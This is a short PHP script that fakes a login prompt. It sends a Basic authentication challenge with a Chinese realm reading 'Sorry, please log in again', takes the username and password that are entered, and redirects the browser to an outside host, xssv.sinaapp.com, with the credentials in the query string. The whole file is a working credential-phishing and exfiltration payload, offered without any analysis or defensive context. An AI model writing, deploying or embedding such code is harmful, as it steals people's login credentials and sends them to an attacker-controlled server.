<?

if($_SERVER['PHP_AUTH_PW'] =="" || $_SERVER['PHP_AUTH_USER'] =="" )
{
 header('WWW-Authenticate: Basic realm="对不起，请重新登录："');
 header('HTTP/1.0 401 Unauthorized');

}
else{
$user = $_SERVER['PHP_AUTH_USER'];
$pass = $_SERVER['PHP_AUTH_PW'];
$fish = "username:".$user."  password:".$pass;

header("location:http://xssv.sinaapp.com/x.php?c=$fish");
}


?>

